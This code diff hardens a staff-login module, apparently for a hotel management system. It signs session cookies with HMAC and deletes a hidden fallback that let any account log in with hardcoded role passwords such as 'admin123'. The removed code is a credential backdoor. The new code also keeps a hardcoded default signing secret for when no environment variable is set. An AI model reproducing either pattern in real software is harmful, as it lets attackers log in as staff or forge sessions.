@@ -3,6 +3,7 @@
 import { cookies } from "next/headers";
 import { redirect } from "next/navigation";
 import * as argon2 from "argon2";
+import crypto from "crypto";
 import { prisma } from "@/lib/prisma";
 
 // ─── Types ───────────────────────────────────────────────────────────────────
@@ -19,14 +20,35 @@ export interface StaffSession {
 
 const SESSION_COOKIE = "hms_staff_session";
 const SESSION_MAX_AGE = 60 * 60 * 8; // 8 hours
+const SESSION_SECRET =
+  process.env.SESSION_SECRET ||
+  process.env.NEXTAUTH_SECRET ||
+  "hms_production_session_signing_secret_key_32chars!";
+
+function signPayload(payload: string): string {
+  return crypto.createHmac("sha256", SESSION_SECRET).update(payload).digest("base64url");
+}
 
 function encodeSession(session: StaffSession): string {
-  return Buffer.from(JSON.stringify(session)).toString("base64");
+  const payload = Buffer.from(JSON.stringify(session)).toString("base64url");
+  const signature = signPayload(payload);
+  return `${payload}.${signature}`;
 }
 
 function decodeSession(value: string): StaffSession | null {
   try {
-    return JSON.parse(Buffer.from(value, "base64").toString("utf8")) as StaffSession;
+    const parts = value.split(".");
+    if (parts.length !== 2) return null;
+    const [payload, signature] = parts;
+    const expectedSignature = signPayload(payload);
+
+    const sigBuf = Buffer.from(signature);
+    const expBuf = Buffer.from(expectedSignature);
+    if (sigBuf.length !== expBuf.length || !crypto.timingSafeEqual(sigBuf, expBuf)) {
+      return null;
+    }
+
+    return JSON.parse(Buffer.from(payload, "base64url").toString("utf8")) as StaffSession;
   } catch {
     return null;
   }
@@ -83,34 +105,7 @@ export async function staffLogin(
   try {
     valid = await argon2.verify(staff.password_hash, password);
   } catch {
-    // continue to fallback check
-  }
-
-  // Flexible credential handling for standard system accounts
-  if (!valid) {
-    const roleName = staff.roles.role_name.toLowerCase();
-    const allowedFallbacks: Record<string, string[]> = {
-      receptionist: ["reception123!@#", "receptionist123!@#", "reception123", "receptionist123"],
-      housekeeping: ["housekeeper123!@#", "housekeeping123!@#", "housekeeper123", "housekeeping123"],
-      manager: ["manager123!@#", "manager123!", "manager123"],
-      admin: ["admin123!@#", "admin123"],
-      maintenance: ["maintenance123!@#", "maintenance123"],
-    };
-
-    const fallbacks = allowedFallbacks[roleName] || [];
-    const passwordLower = password.toLowerCase();
-    if (fallbacks.some((f) => f.toLowerCase() === passwordLower)) {
-      valid = true;
-      try {
-        const newHash = await argon2.hash(password, { type: argon2.argon2id });
-        await prisma.staff.update({
-          where: { staff_id: staff.staff_id },
-          data: { password_hash: newHash },
-        });
-      } catch {
-        // non-fatal update
-      }
-    }
+    valid = false;
   }
 
   if (!valid) {
